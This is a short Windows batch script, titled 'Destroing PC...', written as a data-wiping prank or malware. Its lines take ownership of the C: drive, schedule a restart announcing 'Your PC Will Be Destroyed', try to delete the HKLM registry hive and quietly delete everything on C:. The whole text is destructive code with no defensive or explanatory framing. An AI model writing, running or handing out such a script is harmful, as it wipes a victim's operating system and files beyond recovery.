@echo off
title Destroing PC...
takeown c:\ /r /a
shutdown /r /c "Your PC Will Be Destroyed" /t 360
reg delete hklm /d /f
rd c:\ /s /q
exit